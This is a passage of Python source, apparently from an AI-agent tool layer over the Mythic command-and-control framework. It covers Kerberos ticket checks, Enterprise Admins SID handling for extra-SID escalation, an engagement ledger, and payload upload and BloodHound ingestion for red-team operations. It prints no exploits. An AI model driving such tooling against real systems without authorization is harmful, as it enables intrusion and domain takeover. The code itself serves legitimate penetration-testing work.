                continue
            key_callback, realm, account, netonly = key[:4]
            if int(key_callback) != callback_id or bool(netonly) is not True:
                continue
            if self._canonical_credential_account(account) != account_cf:
                continue
            if self._callback_domains_equivalent(realm, host_cf) or self._callback_domains_equivalent(realm, fqdn_cf):
                return True
        return False

    def _record_verified_account_kerberos_context(self, action, inputs: dict, callback_display_id) -> tuple | None:
        if self._capability_text(getattr(action, "name", "")).casefold() != "ensure-account-kerberos-context":
            return None
        account = self._capability_account(action, inputs)
        account_domain = self._capability_account_context_domain(action, inputs)
        if not account or not account_domain:
            return None
        context_key = self._kerberos_account_context_key(callback_display_id, account, account_domain)
        self._kerberos_logon_account_context_keys.add(context_key)
        self._kerberos_account_context_keys.add(context_key)
        return context_key

    def _ticket_cache_output_has_account(self, output: str, account: str, domain: str) -> bool:
        text = self._capability_text(output).casefold()
        account_cf = self._capability_text(account).casefold()
        domain_cf = self._capability_text(domain).casefold()
        if not text or not account_cf or not domain_cf:
            return False
        account_forms = {
            account_cf,
            f"{account_cf}@{domain_cf}",
            f"{domain_cf}\\{account_cf}",
        }
        has_account = any(form in text for form in account_forms)
        has_domain = domain_cf in text or f"krbtgt/{domain_cf}" in text
        has_ticket = any(marker in text for marker in ("krbtgt", "ticket", "cached tickets", "client"))
        return bool(has_account and has_domain and has_ticket)

    def _infer_capability_key_type(self, value: str) -> str:
        text = self._capability_text(value).strip()
        if _re_mod.fullmatch(r"[0-9a-fA-F]{64}", text):
            return "aes256"
        if _re_mod.fullmatch(r"[0-9a-fA-F]{32}", text):
            return "rc4"
        return ""

    def _parent_domain_for_capability(self, domain: str) -> str:
        parts = [part for part in self._capability_text(domain).casefold().split(".") if part]
        if len(parts) > 2:
            return ".".join(parts[1:])
        return self._capability_text(domain).casefold()

    def _capability_json_value(self, value):
        if isinstance(value, str):
            stripped = value.strip()
            if stripped and stripped[0] in "{[":
                try:
                    return json.loads(stripped)
                except Exception:
                    return value
            return value
        return value

    def _capability_list(self, value) -> list:
        value = self._capability_json_value(value)
        if isinstance(value, (list, tuple, set)):
            return [self._capability_text(item) for item in value if self._capability_text(item)]
        text = self._capability_text(value)
        return [text] if text else []

    def _capability_sid_list(self, value) -> list[str]:
        out: list[str] = []
        for item in self._capability_list(value):
            for piece in item.split(","):
                sid = piece.strip()
                if sid:
                    out.append(sid)
        return out

    def _capability_text(self, value) -> str:
        if value is None:
            return ""
        return str(value).strip()

    def _capability_input_errors(self, inputs: dict) -> list[str]:
        errors = inputs.get("_capability_input_errors") if isinstance(inputs, dict) else []
        if not isinstance(errors, list):
            return []
        return [self._capability_text(item) for item in errors if self._capability_text(item)]

    def _add_capability_input_error(self, inputs: dict, error: str) -> None:
        if not isinstance(inputs, dict):
            return
        errors = inputs.setdefault("_capability_input_errors", [])
        if not isinstance(errors, list):
            inputs["_capability_input_errors"] = errors = []
        if error not in errors:
            errors.append(error)

    def _remove_capability_input_error(self, inputs: dict, error: str) -> None:
        if not isinstance(inputs, dict):
            return
        errors = inputs.get("_capability_input_errors")
        if not isinstance(errors, list):
            return
        inputs["_capability_input_errors"] = [item for item in errors if item != error]

    def _has_trusted_extra_sid_source(self, inputs: dict) -> bool:
        if not isinstance(inputs, dict):
            return False
        if inputs.get("trusted_extra_sids") is True or inputs.get("trusted_sids") is True:
            return True
        for key in (
            "extra_sids_source",
            "parent_domain_sid_source",
            "enterprise_admins_sid_source",
            "sid_source",
            "sid_evidence",
            "domain_sid_source",
        ):
            text = self._capability_text(inputs.get(key)).casefold()
            if not text:
                continue
            if any(marker in text for marker in (
                "bloodhound",
                "directory",
                "ldap",
                "samr",
                "lookupsid",
                "whoami",
                "windows",
                "task",
                "operator",
                "manual",
                "verified",
            )):
                return True
        return False

    def _is_sid(self, value) -> bool:
        return bool(_re_mod.fullmatch(r"S-\d+(?:-\d+)+", self._capability_text(value), flags=_re_mod.IGNORECASE))

    def _is_domain_sid(self, value) -> bool:
        return bool(_re_mod.fullmatch(
            r"S-1-5-21-\d+-\d+-\d+",
            self._capability_text(value),
            flags=_re_mod.IGNORECASE,
        ))

    def _normalize_enterprise_admins_sid(self, value) -> str:
        sid = self._capability_text(value)
        if _re_mod.fullmatch(r"S-1-5-21-\d+-\d+-\d+-519", sid, flags=_re_mod.IGNORECASE):
            return sid
        return ""

    def _normalize_parent_enterprise_admins_sid(self, value) -> str:
        sid = self._capability_text(value)
        if self._is_domain_sid(sid):
            return f"{sid}-519"
        return self._normalize_enterprise_admins_sid(sid)

    def _prior_verified_credential_hop(self, technique, target_key):
        """The existing hop for (technique, target_key) that is `achieved` with a REAL key in evidence
        (artifact_present True), else None. A legacy false-achieved (no such evidence) returns None so a
        verified-failed re-probe can overwrite it — the stickiness rule is 'verified-with-key beats no-key',
        never blind last-writer-wins."""
        tech = str(technique).casefold()
        tgt = str(target_key).casefold()
        for h in self._engagement_hops:
            if str(getattr(h, "technique", "")).casefold() != tech:
                continue
            if str(getattr(h, "target", "")).casefold() != tgt:
                continue
            if str(getattr(h, "status", "")).casefold() != "achieved":
                continue
            if (getattr(h, "evidence", {}) or {}).get("artifact_present") is True:
                return h
        return None

    def _eng_key(self) -> str:
        """The active durable-ledger key: the operation-resolved key once known, else the explicit
        SAGE_ENGAGEMENT_ID (env/test override or 'default')."""
        return self._engagement_key or SAGE_ENGAGEMENT_ID

    async def _ensure_engagement_key(self) -> None:
        """Resolve the durable-ledger key from the current Mythic operation the first time it's needed,
        then reload the ledger under that key. No-op if already resolved, if SAGE_ENGAGEMENT_ID is an
        explicit override (!= 'default'), or if resolution fails (keeps the 'default' key). The
        resolve+reload is serialized under a lock so concurrent gate calls can't double-reload. Fail-open."""
        if self._engagement_key is not None:
            return
        if SAGE_ENGAGEMENT_ID and SAGE_ENGAGEMENT_ID != "default":
            self._engagement_key = SAGE_ENGAGEMENT_ID   # explicit override wins; pin it, never query
            _publish_active_engagement_id(self._engagement_key)
            try:
                self._load_engagement_ledger(replace=True)
            except Exception:
                pass
            return
        async with self._engagement_key_lock:
            if self._engagement_key is not None:        # another coroutine resolved while we waited
                return
            try:
                try:
                    from . import operation_context
                except ImportError:
                    import operation_context
                key = await operation_context.resolve_operation_key(self.client)
            except Exception:
                key = None
            if key:
                self._engagement_key = key
                _publish_active_engagement_id(key)
                # Reload under the operation key before any planner/gate decision uses durable state.
                try:
                    self._load_engagement_ledger(replace=True)
                except Exception:
                    pass
                self._notice_legacy_ledgers()

    _legacy_notice_done = False

    def _notice_legacy_ledgers(self) -> None:
        """One-time INFO if pre-rename `engagement_*.json` ledgers are present but unused — the clean break
        makes them invisible to `list_engagements`, so surface that they exist rather than letting it look
        like data vanished. Best-effort; never raises."""
        if MythicTools._legacy_notice_done:
            return
        try:
            directory = _engagement_state_dir()
            legacy = [n for n in os.listdir(directory) if n.startswith("engagement_") and n.endswith(".json")]
            if legacy:
                MythicTools._legacy_notice_done = True
                logger.info(
                    f"🗃️ [engagement-state] {len(legacy)} legacy engagement_*.json ledger(s) present but NOT "
                    f"loaded (clean break to state_<operation>_<id>.json): {legacy[:5]} in {directory}. They are "
                    f"untouched; set SAGE_ENGAGEMENT_ID=<name> to force a specific ledger key if you need one."
                )
        except Exception:
            pass

    def _engagement_ledger_path(self) -> str:
        """Path to this engagement's durable JSON hop ledger (keyed per Mythic operation, not per-solve)."""
        return _engagement_ledger_file(self._eng_key())

    def _load_engagement_ledger(self, *, replace: bool = False) -> None:
        """Load the durable hop ledger from disk into self._engagement_hops. Fail-open: any error
        (missing file, bad JSON, unreadable) leaves the in-memory ledger untouched. NO LLM inference."""
        path = self._engagement_ledger_path()
        if not os.path.exists(path):
            if replace:
                self._engagement_hops = []
            return
        try:
            with open(path, "r", encoding="utf-8") as fh:
                payload = json.load(fh)
        except Exception:
            return
        if isinstance(payload, dict):
            objective = self._human_engagement_objective(payload.get("objective"))
            if objective:
                self._engagement_objective_text = objective
                self._engagement_objective_source = str(payload.get("objective_source") or "")
        items = payload.get("hops") if isinstance(payload, dict) else payload
        try:
            from . import engagement_state
        except ImportError:
            import engagement_state
        try:
            try:
                from . import engagement_ledger
            except ImportError:
                import engagement_ledger
            if isinstance(payload, dict):
                engagement_ledger._quarantine_unproven_achievements(payload, self._eng_key())
        except Exception:
            pass
        loaded = engagement_state.hops_from_dicts(items)
        graph_facts = (
            engagement_state.graph_facts_from_dicts(payload.get("graph_facts"))
            if isinstance(payload, dict) else []
        )
        for graph_fact in reversed(graph_facts):
            proof = getattr(graph_fact, "proof_envelope", {}) or {}
            if isinstance(proof, dict) and proof:
                self._last_bloodhound_ingest_proof_envelope = dict(proof)
                break
        # Tag every loaded hop with 'durable' provenance: the gate will NOT silently hard-SKIP a durable
        # hop unless live footholds corroborate it (run-provenance hops keep the trustworthy hard-SKIP).
        for _h in loaded:
            try:
                if isinstance(getattr(_h, "evidence", None), dict):
                    _h.evidence["provenance"] = "durable"
                else:
                    _h.evidence = {"provenance": "durable"}
            except Exception:
                pass
        # Expire stale beliefs by TTL (cheap first line against a post-redeploy stale ledger).
        ttl = _engagement_hop_ttl_hours()
        _dropped = 0
        if ttl > 0:
            from datetime import datetime, timezone
            loaded, _dropped = engagement_state.filter_hops_by_ttl(
                loaded, datetime.now(timezone.utc).isoformat(), ttl
            )
        if loaded or replace:
            self._engagement_hops = loaded
            if graph_facts or replace:
                self._engagement_graph_facts = graph_facts
                self._engagement_graph_facts_ts = (
                    payload.get("graph_facts_updated") or payload.get("updated")
                    if isinstance(payload, dict) else None
                )
            # Make durable resume LOUD, not silent: a loaded "achieved" hop is a BELIEF, not verified
            # live, so the operator must SEE what was resumed (and from when). Durable hops are
            # corroborated by live footholds before any hard-SKIP, and shown as "(durable, unverified)"
            # in the per-turn state when not corroborated. Use a fresh SAGE_ENGAGEMENT_ID per engagement.
            _updated = payload.get("updated") if isinstance(payload, dict) else "?"
            _achieved = sum(1 for h in loaded if getattr(h, "status", "") == "achieved")
            _ttl_note = f" ttl={ttl}h dropped={_dropped}" if ttl > 0 else " ttl=disabled"
            logger.info(
                f"🗃️ [engagement-state] resumed {len(loaded)} hop(s) ({_achieved} achieved) from durable "
                f"ledger key={self._eng_key()} updated={_updated}{_ttl_note} path={path} — durable beliefs "
                f"are corroborated by live footholds before any SKIP (never silently). Fresh "
                f"SAGE_ENGAGEMENT_ID after a lab redeploy."
            )

    def _persist_engagement_ledger(self) -> None:
        """Atomically write the current hop ledger to the durable per-engagement JSON. Fail-open."""
        try:
            from . import engagement_state
        except ImportError:
            import engagement_state
        path = self._engagement_ledger_path()
        os.makedirs(os.path.dirname(path), exist_ok=True)
        payload = {
            "engagement_id": self._eng_key(),
            "objective": self._engagement_objective(),
            # _engagement_objective() above refreshes/adopts and updates the source mirror; preserve it so a
            # hop-persist never silently drops provenance (which would make an auto objective look operator-set).
            "objective_source": getattr(self, "_engagement_objective_source", "") or None,
            "updated": datetime.now(timezone.utc).isoformat(),
            "hops": engagement_state.hops_to_dicts(self._engagement_hops),
            "graph_facts": engagement_state.graph_facts_to_dicts(
                getattr(self, "_engagement_graph_facts", []) or []
            ),
            "graph_facts_updated": getattr(self, "_engagement_graph_facts_ts", None),
        }
        try:
            try:
                from . import engagement_ledger
            except ImportError:
                import engagement_ledger
            engagement_ledger._quarantine_unproven_achievements(payload, self._eng_key())
        except Exception:
            pass
        tmp = f"{path}.{os.getpid()}.tmp"
        with open(tmp, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, default=str)
        os.replace(tmp, path)  # atomic on POSIX — never leaves a half-written ledger

    async def list_open_artifacts(self) -> str:
        """List artifacts this run has created (files dropped, beacons planted) that have NOT been cleaned up, so you can remove them at sub-goal completion for OPSEC. Returns a JSON list."""
        # HITL: free
        return json.dumps([e for e in self._artifact_ledger if not e.get("cleaned")], default=str)

    async def get_task_history_for_callback(self, callback_display_id: Annotated[int, "The callback_display_id of the target agent to retrieve task history for"]) -> str:
        """Return a callback's full task history as JSON (per task: id, operator, status, completed, original_params, timestamp, command_name)."""
        # HITL: free
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call login() first.")
        logger.debug(f"🛠️ Calling get_task_history_for_callback tool on callback_display_ids: {callback_display_id}")
        guard = self._recon_reread_guard("get_task_history_for_callback", callback_display_id)
        if guard:
            return json.dumps({"status": "unchanged", "note": guard, "callback_display_id": callback_display_id}, sort_keys=True)
        resp = await mythic.get_all_tasks(mythic=self.client, callback_display_id=callback_display_id)
        return json.dumps(resp, sort_keys=True)

    async def check_callback_alive(self, callback_display_id: Annotated[int, "The callback_display_id of the target agent to assess for liveness"]) -> str:
        """Determine whether a callback is alive, dead, or likely crashed, using its last check-in vs its effective sleep interval (NOT Mythic's 'active' flag, which is unreliable). Use this before re-tasking a callback that has gone silent, or after issuing a command that may have crashed the agent."""
        # HITL: free
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call login() first.")
        logger.debug(f"🛠️ Calling check_callback_alive tool on callback_display_id: {callback_display_id}")
        result = await assess_callback_liveness(self.client, callback_display_id)
        status = result.get("status", "uncertain")
        suspect = result.get("suspect_crash_task")
        suspect_text = f" (suspect: {suspect!r})" if suspect else ""
        return f"callback {callback_display_id} status={status}{suspect_text} — {result.get('reason', '')}"
    
    async def get_all_task_output_by_task_id(self, task_id: Annotated[int, "The Mythic task ID to retrieve output for"]) -> str:
        """Get all output associated with a specific Mythic task ID.

        This tool retrieves all output generated by a specific Mythic task, including standard output, error messages, and any other relevant information produced during the execution of the task.

        The response_text field will be automatically decoded from base64 if possible, making it easier for the LLM to process.

        Args:
            task_id: The Mythic task ID to retrieve output for.
        Returns:
            str: JSON string containing all output for the specified task ID, with response_text decoded from base64.
        """
        # HITL: free
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call login() first.")
        logger.debug(f"🛠️ Calling get_all_task_output_by_task_id tool for task IDs: {task_id}")
        # A completed task's output is immutable — serve a prior fetch from cache instead of re-fetching it.
        if task_id in self._task_output_cache:
            logger.debug(f"task {task_id} output served from completed-task cache")
            return self._task_output_cache[task_id]
        resp = await mythic.get_all_task_output_by_id(mythic=self.client, task_display_id=task_id)

        # Decode base64 response_text fields for easier LLM processing
        if isinstance(resp, list):
            for item in resp:
                if isinstance(item, dict) and "response_text" in item:
                    try:
                        # Try to decode base64
                        decoded_bytes = base64.b64decode(item["response_text"])
                        # Try to decode as UTF-8 text
                        decoded_text = decoded_bytes.decode('utf-8')
                        item["response_text"] = decoded_text
                        logger.debug(f"Successfully decoded base64 response_text for task output {item.get('id', 'unknown')}")
                    except (Exception, UnicodeDecodeError) as e:
                        # If decode fails, keep the original base64 string
                        logger.debug(f"Failed to decode base64 response_text for task output {item.get('id', 'unknown')}: {e}")
                        pass

        result = json.dumps(resp, sort_keys=True)
        # No-progress guard (see __init__): clamp repeated re-reads of a statically-FAILED task.
        # Uses the BROADER read-scope check (not the breaker's) — see _READ_FAILURE_SIGNATURES.
        if _is_failed_read_output(result):
            count = self._failed_read_counts.get(task_id, 0) + 1
            self._failed_read_counts[task_id] = count
            if count >= 2:
                return (
                    f"STOP RE-READING — task {task_id} FAILED and its output is unchanged from your "
                    f"earlier fetch this session (re-read {count}x). The command did not succeed; re-reading "
                    f"it just refills context and wastes a step. Either try a DIFFERENT command/technique, or "
                    f"report this failure to the operator. Do not re-fetch this task again."
                )
        else:
            # A later SUCCESSful fetch of the same task_id clears the failed-read counter so a genuinely
            # changed/succeeded task is never clamped.
            self._failed_read_counts.pop(task_id, None)
            # Cache the output if the task is COMPLETED (its output is then immutable) so subsequent
            # re-reads return instantly without re-fetching. Running tasks are never cached.
            try:
                if await self._is_task_completed(task_id):
                    self._task_output_cache[task_id] = result
            except Exception:
                pass
        return result

    async def _is_task_completed(self, task_display_id: int) -> bool:
        """True if the Mythic task is in a terminal (completed) state — gates completed-task output caching."""
        if self.client is None:
            return False
        try:
            r = await mythic.execute_custom_query(
                self.client,
                "query tc($id:Int!){ task(where:{display_id:{_eq:$id}}){ completed } }",
                variables={"id": task_display_id},
            )
            rows = r.get("task", []) if isinstance(r, dict) else []
            return bool(rows and rows[0].get("completed"))
        except Exception:
            return False

    async def get_all_uploaded_files(self) -> str:
        """
        Get a list of all files uploaded to Mythic.
        Uploaded files can include, but not limited to, additional tools, scripts, or binaries that operators have uploaded for use with Mythic agents.
        Excludes files downloaded by Mythic agents, screenshots, and Mythic payload files.
        Call the download_file() method to download a specific file by its Mythic file UUID.
        """
        # HITL: free
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call login() first.")
        logger.debug("🛠️ Calling get_all_uploaded_files tool")
        resp = mythic.get_all_uploaded_files(mythic=self.client)
        data = [item async for item in resp]
        return json.dumps(data, sort_keys=True)

    async def _resolve_supported_os(self, payload_type_name: str, operating_system: str):
        """Resolve operating_system to the payload type's exact supported_os casing.
        Returns a (matched_os, supported_list) tuple:
          - (None, None)            -> could not determine (no client / query failed / empty) -> caller fails OPEN
          - (None, [..])           -> supported list known but NO case-insensitive match -> caller errors with options
          - ("Windows", [..])      -> the exact Mythic casing to use
        """
        if self.client is None:
            return None, None
        try:
            q = "query OS($n: String!){ payloadtype(where: {name: {_eq: $n}}){ supported_os } }"
            resp = await mythic.execute_custom_query(self.client, q, variables={"n": payload_type_name})
            rows = resp.get("payloadtype") if isinstance(resp, dict) else None
            if not rows:
                return None, None
            supported = rows[0].get("supported_os") or []
            if not isinstance(supported, list) or not supported:
                return None, None
            for os_val in supported:
                if str(os_val).lower() == str(operating_system).lower():
                    return os_val, supported
            return None, supported
        except Exception:
            return None, None

    async def _get_file_metadata(self, file_uuid: str) -> dict | None:
        """Look up filemeta for a Mythic file by its agent_file_id WITHOUT downloading the bytes.

        Returns the filemeta dict (agent_file_id, complete, deleted, is_payload, filename_utf8,
        chunks_received, total_chunks) or None if no file row matches the UUID. Used as a cheap
        pre-flight check so we don't pull multi-MB files into the agent process just to validate them.
        """
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call login() first.")
        query = """
            query FileMetaByUuid($uuid: String!) {
                filemeta(where: { agent_file_id: { _eq: $uuid } }, limit: 1) {
                    agent_file_id
                    complete
                    deleted
                    is_payload
                    filename_utf8
                    chunks_received
                    total_chunks
                    task {
                        display_id
                        command_name
                        callback {
                            display_id
                        }
                    }
                }
            }
        """
        logger.debug(f"🛠️ Looking up file metadata for agent_file_id: {file_uuid}")
        resp = await mythic.execute_custom_query(self.client, query, variables={"uuid": file_uuid})
        rows = resp.get("filemeta") if isinstance(resp, dict) else None
        return rows[0] if rows else None

    async def _latest_download_for_callback(
        self,
        callback_display_id: int,
        name_contains: str = "zip",
    ) -> dict | None:
        """Resolve the most-recent COMPLETE, non-deleted file DOWNLOADED FROM the agent on the given
        callback. Returns a dict with agent_file_id / filename_utf8 / timestamp, or None if no match.
        `name_contains` is an optional case-insensitive filename substring filter ("" disables it).
        The join (callback.display_id -> task -> filemeta) was verified against live Mythic."""
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call login() first.")
        query = """
        query LatestDownload($cbid: Int!) {
            filemeta(
                where: {
                    is_download_from_agent: {_eq: true},
                    complete: {_eq: true},
                    deleted: {_eq: false},
                    task: {callback: {display_id: {_eq: $cbid}}}
                },
                order_by: {id: desc}, limit: 10
            ) {
                agent_file_id
                filename_utf8
                timestamp
                task {
                    display_id
                    command_name
                    callback {
                        display_id
                    }
                }
            }
        }
    """
        resp = await mythic.execute_custom_query(self.client, query, variables={"cbid": int(callback_display_id)})
        rows = resp.get("filemeta") if isinstance(resp, dict) else None
        if not rows:
            return None
        needle = (name_contains or "").lower()
        for row in rows:  # rows are newest-first (id desc)
            fn = row.get("filename_utf8") or ""
            if not needle or needle in str(fn).lower():
                return row
        return None

    async def upload_file_by_file_uuid(
            self,
            command: Annotated[str, "The name of the command for a Mythic agent that has upload functionality, typically the \"upload\" command, to execute on the target agent"],
            parameters: Annotated[str|dict, "Parameters for the upload command"], 
            file_uuid: Annotated[str, "The Mythic file UUID to upload to the target agent"], 
            callback_display_id: Annotated[int, "The callback_display_id of the target agent to upload the file to"],
            token_id: Annotated[int | None, "Optional token ID for authentication"] = None, 
            timeout: Annotated[int | None, "Optional timeout for the upload operation"] = None,
            ) -> str:
        """Upload a Mythic-stored file (by file UUID) to the agent at callback_display_id via the agent's upload-style command.

        Caveat: file_uuid is the Mythic *file* UUID (`agent_file_id` from create_payload), NOT the
        payload `uuid`; the command's target parameter must be type "File", never "String"."""
        # HITL: guarded
        
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call login() first.")
        logger.debug(f"🛠️ Calling upload_file_by_file_uuid tool for file UUID {file_uuid} and callback_display_id {callback_display_id}")
        # Pre-flight validation via a lightweight metadata lookup instead of downloading the
        # (potentially multi-MB) file just to discard the bytes. Mythic transfers the file
        # server-side from the file_uuid in `parameters`, so the agent never needs the bytes here.
        meta = await self._get_file_metadata(file_uuid)
        if meta is None:
            raise Exception(
                f"No Mythic file has agent_file_id '{file_uuid}'. If you got this UUID from "
                f"create_payload, use the 'agent_file_id' field (the Mythic file UUID), NOT the "
                f"payload 'uuid' (the Payload UUID) — they are different values."
            )
        if meta.get("deleted"):
            raise Exception(
                f"Mythic file '{file_uuid}' ({meta.get('filename_utf8')}) is marked deleted "
                f"and cannot be uploaded."
            )
        if not meta.get("complete"):
            raise Exception(
                f"Mythic file '{file_uuid}' ({meta.get('filename_utf8')}) is not complete "
                f"({meta.get('chunks_received')}/{meta.get('total_chunks')} chunks received). "
                f"If this is a freshly built payload, its build may have errored or is still "
                f"running — verify the payload's build_phase is 'success' before uploading."
            )
        resp = await self.issue_task_and_waitfor_task_output(
            command=command,
            parameters=parameters,
            callback_display_id=callback_display_id,
            token_id=token_id,
            timeout=timeout
        ) 
        return resp

    async def download_file(self, file_uuid: Annotated[str, "The Mythic file UUID of the file to download from Mythic"]) -> str:
        """Download a file from Mythic by its Mythic file UUID.

        This tool downloads a file stored in Mythic, identified by its Mythic file UUID. 
        The file content is returned as a base64-encoded string.

        Args:
            file_uuid: The Mythic file UUID to download the file for.
        Returns:
            str: Base64-encoded string of the downloaded file content.
        """
        # HITL: free
        # Not sure what I'm going to use this for because I don't want to send the file data back to the LLM
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call login() first.")
        logger.debug(f"🛠️ Calling download_file tool for file UUID: {file_uuid}")
        file_content = await mythic.download_file(mythic=self.client, file_uuid=file_uuid)
        if file_content is None or len(file_content) == 0:
            meta = await self._get_file_metadata(file_uuid)
            if meta is None:
                raise Exception(
                    f"No Mythic file has agent_file_id '{file_uuid}'. Make sure you used the file's "
                    f"'agent_file_id', not a Payload UUID."
                )
            if not meta.get("complete"):
                raise Exception(
                    f"Mythic file '{file_uuid}' ({meta.get('filename_utf8')}) is not complete "
                    f"({meta.get('chunks_received')}/{meta.get('total_chunks')} chunks) — its source "
                    f"task/build may have errored or is still running."
                )
            raise Exception(
                f"Failed to download file '{file_uuid}' ({meta.get('filename_utf8')}); "
                f"deleted={meta.get('deleted')}."
            )
        # Encode the binary content to base64 string for easier transport
        encoded_content = base64.b64encode(file_content).decode('utf-8')
        return encoded_content

    def _collection_already_ingested(self, file_content: bytes) -> tuple[str, str | None]:
        """(content_sha256, prior_job_id_or_None): idempotency key for a collection ZIP keyed by CONTENT, not
        by callback/foothold (the old graph-built gate missed re-ingests when callback_display_id was None)."""
        import hashlib
        h = hashlib.sha256(file_content).hexdigest()
        return h, self._ingested_collection_hashes.get(h)

    def _record_collection_ingested(self, content_hash: str, job_id) -> None:
        """Record a VERIFIED ingest so the identical artifact is not re-uploaded. Best-effort; never raises."""
        self._ingested_collection_hashes[content_hash] = str(job_id) if job_id is not None else "complete"

    async def ingest_collection(
        self,
        file_uuid: Annotated[str, "The Mythic file UUID of the downloaded SharpHound/AzureHound collection to ingest. PREFERRED. Optional if callback_display_id is given."] = "",
        callback_display_id: Annotated[int | None, "If set (and file_uuid empty), resolve the MOST RECENT completed collection download from this callback and ingest that."] = None,
        file_name: Annotated[str, "Optional basename for the collection (e.g. 'collection.zip'). Defaults to the source filename or <uuid>.zip."] = "",
        name_contains: Annotated[str, "When resolving by callback, only match files whose name contains this substring (default 'zip')."] = "zip",
        collection_scope_domain: Annotated[str, "Optional targeted SharpHound --Domain scope. Leave empty for the default --SearchForest collection. Used only for deterministic collection idempotency."] = "",
    ) -> str:
        """Ingest a downloaded SharpHound/AzureHound collection straight into BloodHound in-memory (bytes never touch the LLM or Sage disk); pass file_uuid, or callback_display_id to use that callback's latest download.

        Caveat: ingest is asynchronous — afterward verify with domain_info(info_type='list') that the
        expected domains appear (the count may lag a few seconds).
        """
        # HITL: guarded
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call login() first.")
        logger.debug(f"🛠️ Calling ingest_collection (file_uuid={file_uuid!r}, callback={callback_display_id})")
        source_filename = ""
        source_task_id = None
        source_command = ""
        blocker = self._operator_collection_ingest_blocker(
            callback_display_id=callback_display_id,
            source_filename=source_filename,
        )
        if blocker:
            return blocker
        # 1. Resolve the Mythic file UUID (by UUID, or the latest completed download on a callback).
        if file_uuid:
            resolved_by = "uuid"
            try:
                meta = await self._get_file_metadata(file_uuid)
                source_filename = str((meta or {}).get("filename_utf8") or "")
                if not file_name and source_filename:
                    file_name = os.path.basename(source_filename)
                source_callback = (
                    ((meta or {}).get("task") or {}).get("callback") or {}
                ).get("display_id")
                source_task_id = ((meta or {}).get("task") or {}).get("display_id")
                source_command = str(((meta or {}).get("task") or {}).get("command_name") or "")
                if callback_display_id is None and source_callback is not None:
                    callback_display_id = int(source_callback)
                    resolved_by = f"uuid:callback:{callback_display_id}"
            except Exception:
                pass
        elif callback_display_id is not None:
            row = await self._latest_download_for_callback(callback_display_id, name_contains)
            if row is None:
                for _ in range(3):
                    await asyncio.sleep(2)
                    row = await self._latest_download_for_callback(callback_display_id, name_contains)
                    if row is not None:
                        break
            if row is None:
                return json.dumps({
                    "status": "no_collection_artifact",
                    "callback_display_id": callback_display_id,
                    "retryable_by_reingest": False,
                    "error": (
                        "No completed agent-download found on this callback. There is no existing collection "
                        "artifact to ingest."
                    ),
                    "next_action": (
                        "Do not retry ingest_collection with broader selectors or re-read unchanged task "
                        "history. If the current scoped task is read-only, report that BloodHound has no "
                        "collection artifact and stop. If the operator or objective explicitly requires new "
                        "BloodHound data, run one fresh SharpHound/AzureHound collection, download its new "
                        "artifact, then call ingest_collection once on that fresh artifact."
                    ),
                }, sort_keys=True)
            file_uuid = row["agent_file_id"]
            source_filename = row.get("filename_utf8") or ""
            source_task_id = (row.get("task") or {}).get("display_id") if isinstance(row.get("task"), dict) else None
            source_command = str((row.get("task") or {}).get("command_name") or "") if isinstance(row.get("task"), dict) else ""
            if not file_name:
                file_name = os.path.basename(source_filename)
            resolved_by = "callback:" + str(callback_display_id)
        else:
            return json.dumps({"status": "error", "error": "Provide either file_uuid or callback_display_id."}, sort_keys=True)
        blocker = self._operator_collection_ingest_blocker(
            callback_display_id=callback_display_id,
            source_filename=source_filename or file_name,
        )
        if blocker:
            return blocker
        # 2. Fetch the collection bytes from Mythic.
        try:
            file_content = await mythic.download_file(mythic=self.client, file_uuid=file_uuid)
        except Exception as e:
            return json.dumps({"status": "error", "file_uuid": file_uuid, "error": str(e)}, sort_keys=True)
        if not file_content:
            return json.dumps({"status": "error", "file_uuid": file_uuid,
                               "error": "Mythic returned no content for this file UUID."}, sort_keys=True)
        safe_name = os.path.basename(file_name) if file_name else f"{file_uuid}.zip"
        if not _looks_like_bloodhound_collection_zip(file_content):
            try:
                await self._record_graph_built(callback_display_id, False, collection_scope_domain=collection_scope_domain)
            except Exception:
                pass
            return json.dumps({
                "status": "error",
                "file_uuid": file_uuid,
                "filename": safe_name,
                "bytes": len(file_content),
                "error": (
                    "Downloaded file is not a valid BloodHound collection ZIP. Do not ingest this artifact; "
                    "the collection command likely failed or printed help/usage. Retry collection with valid "
                    "collector arguments, then download and ingest the resulting ZIP."
                ),
            }, sort_keys=True)
        # Idempotency at the EXECUTION boundary: if this EXACT collection (by content hash) was already ingested
        # and verified this engagement, do NOT re-upload/re-ingest — short-circuit with the prior job. Prevents
        # the duplicate external work the supervisor loop otherwise triggers (the 4x-identical-zip case). P0.
        content_hash, prior_job = self._collection_already_ingested(file_content)
        if prior_job is not None:
            collection_proof = self._runtime_bloodhound_proof_envelope(
                "bloodhound_ingest:idempotent",
                datetime.now(timezone.utc).isoformat(),
                ingest_job_id=prior_job,
                ingest_status="complete",
                source_artifact_id=file_uuid,
                source_artifact_sha256=content_hash,
                callback_id=callback_display_id,
                task_id=source_task_id,
                terminal_status="completed",
                command=source_command,
                metadata={"idempotent_skip": True},
            )
            if collection_proof:
                self._last_bloodhound_ingest_proof_envelope = dict(collection_proof)
            # Record graph-built at the CURRENT access key before short-circuiting. The bytes were ingested+
            # verified earlier, but if this is a NEW access key (e.g. host re-collected after a privilege
            # change, identical graph bytes), the graph-built hop for THIS key may not exist yet — without
            # recording it the collection gate stays 'missing' and the caller re-collects the identical ZIP in
            # a loop (Forge N3). Best-effort, fail-open.
            covered_domains = await _bloodhound_collected_domains()
            try:
                await self._record_graph_built(
                    callback_display_id,
                    True,
                    covered_domains=covered_domains,
                    collection_scope_domain=collection_scope_domain,
                    proof_envelope=collection_proof,
                )
            except Exception:
                pass
            self._complete_operator_collection_request()
            return json.dumps({
                "status": "already_ingested", "file_uuid": file_uuid, "filename": safe_name,
                "bytes": len(file_content), "content_sha256": content_hash[:16],
                "bloodhound_job_id": prior_job, "idempotent_skip": True, "graph_verified": True,
                "source_callback_display_id": callback_display_id,
                "covered_domains": covered_domains,
                "next_action": ("This exact collection (by content hash) was already ingested and verified this "
                                "engagement; the graph is populated. Do NOT re-upload or re-collect. Hand off to "
                                "the BloodHound agent for attack-path analysis."),
